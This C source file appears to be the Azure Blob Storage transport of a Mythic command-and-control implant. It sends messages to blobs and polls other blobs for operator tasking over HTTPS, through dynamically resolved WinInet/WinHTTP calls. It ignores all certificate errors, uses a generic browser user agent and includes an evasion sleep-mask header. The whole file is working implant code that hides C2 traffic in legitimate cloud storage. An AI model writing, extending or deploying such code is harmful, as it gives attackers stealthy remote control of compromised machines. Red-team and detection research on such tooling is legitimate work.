#include "config.h"
#ifdef AZURE_BLOB_TRANSPORT

#include "common.h"
#include "transport_azure_blob.h"
#include "evasion/sleepmask.h"

// ── Azure Blob Storage transport ────────────────────────────────────────────
//
// Protocol (see the azure_blob C2 profile):
//   PUT  https://{host}/{container}/ats/{message-id}.blob  body = message
//   GET  https://{host}/{container}/sta/{message-id}.blob  poll until 200
//   DELETE the sta blob once consumed
//
// The C2 server relays bytes verbatim between the blobs and Mythic's
// agent_message endpoint, so the wire format here is identical to the HTTP
// profile: base64(uuid36 + payload), response arrives as base64 text.
// No Azure SDK, no management API - plain REST with a container-scoped SAS.
//
// All requests are HTTPS (443) to {account}.blob.core.windows.net. The SAS
// token rides in the query string; nothing is signed client-side.

#define HTTP_QUERY_STATUS_CODE       19       // HTTP_QUERY_STATUS_CODE
#define HTTP_QUERY_FLAG_NUMBER       0x20000000
#define INTERNET_SERVICE_HTTP        3
#define INTERNET_FLAG_SECURE         0x00800000
#define INTERNET_FLAG_RELOAD         0x80000000
#define INTERNET_FLAG_NO_CACHE_WRITE 0x04000000
#define INTERNET_OPTION_SECURITY_FLAGS 31
#define SECURITY_FLAG_IGNORE_ALL     0x00003380

// WinHTTP constants (kept local: winhttp.h isn't includable in all toolchains)
#define WINHTTP_QUERY_STATUS_CODE     19
#define WINHTTP_QUERY_FLAG_NUMBER     0x20000000
#define WINHTTP_HEADER_NAME_BY_INDEX  0xFFFFFFFF
#define WINHTTP_FLAG_SECURE           0x00800000
#define WINHTTP_OPTION_SECURITY_FLAGS 31
#define WINHTTP_SEC_FLAG_IGNORE_ALL   0x00003300

#define BLOB_MAX_POLLS 90              // ~90 * sleep_ms before giving up
#define BLOB_HDR_MAX   512

// ── v4 GUID message-id from a per-instance xorshift (no CRT, no APIs) ──────

static DWORD blob_rand(PINSTANCE inst) {
    UINT64 t = __rdtsc();
    DWORD s = (DWORD)(t >> 16) ^ (DWORD)t ^ inst->Blob.msg_seq ^ (DWORD)(ULONG_PTR)inst;
    if (!s) s = 0x9E3779B9;
    s ^= s << 13; s ^= s >> 17; s ^= s << 5;
    inst->Blob.msg_seq++;
    return s;
}

// Formats an RFC4122 v4 UUID (version nibble 4, variant 10xx) into out[40].
static void blob_msg_id(PINSTANCE inst, char out[40]) {
    BYTE r[16];
    for (int i = 0; i < 16; i += 4) {
        DWORD v = blob_rand(inst);
        r[i]   = (BYTE)(v);
        r[i+1] = (BYTE)(v >> 8);
        r[i+2] = (BYTE)(v >> 16);
        r[i+3] = (BYTE)(v >> 24);
    }
    r[6] = (BYTE)((r[6] & 0x0F) | 0x40);   // version 4
    r[8] = (BYTE)((r[8] & 0x3F) | 0x80);   // variant 10xx

    static const char hex[] = "0123456789abcdef";
    int p = 0;
    for (int i = 0; i < 16; i++) {
        if (i == 4 || i == 6 || i == 8 || i == 10) out[p++] = '-';
        out[p++] = hex[r[i] >> 4];
        out[p++] = hex[r[i] & 0x0F];
    }
    out[p] = 0;
}

// ── REST request over WinInet or WinHTTP ────────────────────────────────────
//
// Returns the HTTP status code (0 on transport failure). Body (optional) is
// es_malloc'd and returned via resp/resp_len; caller frees.

static DWORD blob_request(PINSTANCE inst, const char* verb, const char* path,
                          const char* extra_hdr, BYTE* body, DWORD body_len,
                          BYTE** resp, DWORD* resp_len) {
    if (resp) *resp = NULL;
    if (resp_len) *resp_len = 0;
    if (!inst->Blob.host[0] || !inst->Blob.container[0]) return 0;

    // Full URL path: /{container}/{path}?{sas}
    char url[1400];
    int up = 0;
    url[up++] = '/';
    for (int i = 0; inst->Blob.container[i] && up < 200; i++) url[up++] = inst->Blob.container[i];
    if (path[0] != '/') url[up++] = '/';
    for (int i = 0; path[i] && up < 300; i++) url[up++] = path[i];
    if (inst->Blob.sas[0]) {
        url[up++] = '?';
        const char* s = inst->Blob.sas;
        if (*s == '?') s++;   // tolerate a leading '?' from the builder
        for (; *s && up < 1350; s++) url[up++] = *s;
    }
    url[up] = 0;

#ifdef USE_WININET
    if (!inst->Win32.InternetOpenA || !inst->Win32.HttpSendRequestA ||
        !inst->Win32.HttpQueryInfoA || !inst->Win32.InternetReadFile)
        return 0;

    HINTERNET hSession = inst->Win32.InternetOpenA("Mozilla/5.0", 0, NULL, NULL, 0);
    if (!hSession) return 0;

    HINTERNET hConnect = inst->Win32.InternetConnectA(
        hSession, inst->Blob.host, 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { inst->Win32.InternetCloseHandle(hSession); return 0; }

    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE;
    HINTERNET hReq = inst->Win32.HttpOpenRequestA(hConnect, verb, url, NULL, NULL, NULL, flags, 0);
    if (!hReq) {
        inst->Win32.InternetCloseHandle(hConnect);
        inst->Win32.InternetCloseHandle(hSession);
        return 0;
    }

    DWORD sec = SECURITY_FLAG_IGNORE_ALL;
    inst->Win32.InternetSetOptionA(hReq, INTERNET_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));

    // blob headers: BlockBlob type for PUT, octet-stream content
    char hdr[BLOB_HDR_MAX];
    int hp = 0;
    const char* blob_type = (verb[0] == 'P' && verb[1] == 'U') ? "BlockBlob" : NULL;
    if (blob_type) {
        for (const char* s = "x-ms-blob-type: BlockBlob\r\n"; *s; s++) hdr[hp++] = *s;
    }
    if (body) {
        for (const char* s = "Content-Type: application/octet-stream\r\n"; *s && hp < BLOB_HDR_MAX - 1; s++) hdr[hp++] = *s;
    }
    if (extra_hdr) {
        for (const char* s = extra_hdr; *s && hp < BLOB_HDR_MAX - 1; s++) hdr[hp++] = *s;
    }
    hdr[hp] = 0;

    BOOL sent = inst->Win32.HttpSendRequestA(hReq, hdr[0] ? hdr : NULL, hp, body, body_len);
    DWORD status = 0;
    if (sent) {
        DWORD sz = sizeof(status);
        inst->Win32.HttpQueryInfoA(hReq,
            HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &status, &sz, NULL);

        if (resp && status >= 200 && status < 300) {
            DWORD total = 0;
            BYTE* buf = NULL;
            BYTE  tmp[4096];
            DWORD read = 0;
            while (inst->Win32.InternetReadFile(hReq, tmp, sizeof(tmp), &read) && read > 0) {
                BYTE* nb = (BYTE*)es_realloc(inst, buf, total + read);
                if (!nb) { if (buf) es_free(inst, buf); total = 0; break; }
                buf = nb;
                es_memcpy(buf + total, tmp, read);
                total += read;
            }
            if (total > 0) { *resp = buf; if (resp_len) *resp_len = total; }
            else if (buf) es_free(inst, buf);
        }
    }

    inst->Win32.InternetCloseHandle(hReq);
    inst->Win32.InternetCloseHandle(hConnect);
    inst->Win32.InternetCloseHandle(hSession);
    return sent ? status : 0;

#else // USE_WINHTTP

    if (!inst->Win32.WinHttpOpen || !inst->Win32.WinHttpSendRequest ||
        !inst->Win32.WinHttpQueryHeaders || !inst->Win32.WinHttpReadData)
        return 0;

    wchar_t wurl[1400];
    wchar_t whost[256];
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, url, -1, wurl, 1400);
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, inst->Blob.host, -1, whost, 256);

    HINTERNET hSession = inst->Win32.WinHttpOpen(L"Mozilla/5.0", 0, NULL, NULL, 0);
    if (!hSession) return 0;

    HINTERNET hConnect = inst->Win32.WinHttpConnect(hSession, whost, 443, 0);
    if (!hConnect) { inst->Win32.WinHttpCloseHandle(hSession); return 0; }

    wchar_t wverb[8];
    inst->Win32.MultiByteToWideChar(CP_ACP, 0, verb, -1, wverb, 8);

    HINTERNET hReq = inst->Win32.WinHttpOpenRequest(
        hConnect, wverb, wurl, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hReq) {
        inst->Win32.WinHttpCloseHandle(hConnect);
        inst->Win32.WinHttpCloseHandle(hSession);
        return 0;
    }

    inst->Win32.WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS,
                                 (LPVOID)(DWORD_PTR)WINHTTP_SEC_FLAG_IGNORE_ALL, sizeof(DWORD));

    wchar_t whdr[BLOB_HDR_MAX];
    int hp = 0;
    if (verb[0] == 'P' && verb[1] == 'U') {
        for (const wchar_t* s = L"x-ms-blob-type: BlockBlob\r\n"; *s; s++) whdr[hp++] = *s;
    }
    if (body) {
        for (const wchar_t* s = L"Content-Type: application/octet-stream\r\n"; *s && hp < BLOB_HDR_MAX - 1; s++) whdr[hp++] = *s;
    }
    whdr[hp] = 0;
    if (hp > 0) {
        inst->Win32.WinHttpAddRequestHeaders(hReq, whdr, (DWORD)-1, 0x20000000 /*WINHTTP_ADDREQ_FLAG_ADD*/);
    }

    DWORD status = 0;
    BOOL sent = inst->Win32.WinHttpSendRequest(hReq, (LPCWSTR)WINHTTP_HEADER_NAME_BY_INDEX, 0,
                                               body, body_len, body_len, 0);
    if (sent && inst->Win32.WinHttpReceiveResponse(hReq, NULL)) {
        DWORD sz = sizeof(status);
        inst->Win32.WinHttpQueryHeaders(hReq,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            (LPCWSTR)WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, NULL);

        if (resp && status >= 200 && status < 300) {
            DWORD total = 0;
            BYTE* buf = NULL;
            DWORD avail = 0;
            while (inst->Win32.WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
                BYTE* nb = (BYTE*)es_realloc(inst, buf, total + avail);
                if (!nb) { if (buf) es_free(inst, buf); total = 0; break; }
                buf = nb;
                DWORD read = 0;
                inst->Win32.WinHttpReadData(hReq, buf + total, avail, &read);
                total += read;
            }
            if (total > 0) { *resp = buf; if (resp_len) *resp_len = total; }
            else if (buf) es_free(inst, buf);
        }
    }

    inst->Win32.WinHttpCloseHandle(hReq);
    inst->Win32.WinHttpCloseHandle(hConnect);
    inst->Win32.WinHttpCloseHandle(hSession);
    return sent ? status : 0;

#endif
}

static BOOL blob_put(PINSTANCE inst, const char* path, BYTE* data, DWORD len) {
    DWORD st = blob_request(inst, "PUT", path, NULL, data, len, NULL, NULL);
    return st == 201 || st == 200;
}

static BOOL blob_delete(PINSTANCE inst, const char* path) {
    DWORD st = blob_request(inst, "DELETE", path, NULL, NULL, 0, NULL, NULL);
    return st == 202 || st == 200 || st == 404;   // 404 = already gone, fine
}

// ── Send-and-await: the ats/sta polling pattern ─────────────────────────────

BOOL blob_post_response(PINSTANCE inst, BYTE* data, DWORD data_len,
                        BYTE** response, DWORD* resp_len) {
    if (response) *response = NULL;
    if (resp_len) *resp_len = 0;
    if (!data || data_len == 0) return FALSE;

    char msgid[40];
    blob_msg_id(inst, msgid);

    char ats_path[96];
    char sta_path[96];
    {
        const char* pfx = "ats/";
        int p = 0;
        for (int i = 0; pfx[i]; i++) ats_path[p++] = pfx[i];
        for (int i = 0; msgid[i]; i++) ats_path[p++] = msgid[i];
        for (const char* s = ".blob"; *s; s++) ats_path[p++] = *s;
        ats_path[p] = 0;

        p = 0;
        for (const char* s = "sta/"; *s; s++) sta_path[p++] = *s;
        for (int i = 0; msgid[i]; i++) sta_path[p++] = msgid[i];
        for (const char* s = ".blob"; *s; s++) sta_path[p++] = *s;
        sta_path[p] = 0;
    }

    if (!blob_put(inst, ats_path, data, data_len)) {
        DBG(inst, "[ES] blob: ats PUT failed");
        return FALSE;
    }

    // Poll for the reply. Mythic always answers checkin/get_tasking with a
    // non-empty body, so an empty read is treated as "not ready yet" (same
    // semantics the C2 server's 404 gives). Cap the wait so a wedged container
    // can't hang the main loop forever.
    for (int poll = 0; poll < BLOB_MAX_POLLS; poll++) {
        do_sleep(inst, inst->Config.sleep_ms);

        BYTE* body = NULL;
        DWORD body_len = 0;
        DWORD st = blob_request(inst, "GET", sta_path, NULL, NULL, 0, &body, &body_len);

        if (st == 200 && body && body_len > 0) {
            blob_delete(inst, sta_path);   // consume; best-effort
            if (response) *response = body;
            else es_free(inst, body);
            if (resp_len) *resp_len = body_len;
            return TRUE;
        }
        if (body) es_free(inst, body);
    }

    DBG(inst, "[ES] blob: response poll exhausted");
    return FALSE;
}

#endif // AZURE_BLOB_TRANSPORT
